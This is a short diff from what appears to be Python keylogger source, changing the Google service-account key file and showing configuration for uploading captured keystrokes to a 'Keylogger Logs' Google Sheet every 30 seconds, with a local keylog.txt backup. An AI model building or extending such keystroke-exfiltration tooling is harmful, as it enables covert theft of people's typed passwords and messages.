@@ -18,7 +18,7 @@ from google.oauth2.service_account import Credentials
 # ──────────────────────────────────────────────
 # Configuration
 # ──────────────────────────────────────────────
-SERVICE_ACCOUNT_FILE = "keylogger-database-13f0c3b13a4e.json"
+SERVICE_ACCOUNT_FILE = "keylogger-database-47998067cfaa.json"
 SPREADSHEET_NAME     = "Keylogger Logs"
 FLUSH_INTERVAL       = 30        # seconds between Google Sheets uploads
 LOCAL_BACKUP_FILE    = "keylog.txt"
